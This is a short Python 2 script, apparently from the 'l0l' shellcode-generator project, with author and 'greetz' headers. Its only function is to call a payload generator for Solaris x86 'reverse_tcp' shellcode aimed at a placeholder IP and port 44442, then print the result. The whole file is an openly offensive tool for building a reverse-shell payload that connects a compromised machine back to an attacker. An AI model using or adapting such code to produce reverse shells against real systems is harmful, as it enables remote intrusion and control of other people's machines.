#------------------------------------------------------------------# 
#Author  : roissy
#Greetz  : b3mb4m, esw0rmer, bomch4nte
#Concat  : roissy@tuta.io
#Project : https://github.com/roissy/l0l
#LICENSE : https://github.com/roissy/l0l/blob/master/LICENSE
#------------------------------------------------------------------#

from generator import *

i = "255.255.255.255"
p = "44442" 

shellcode = generator( "solarisx86", "reverse_tcp", i, p)

print shellcode


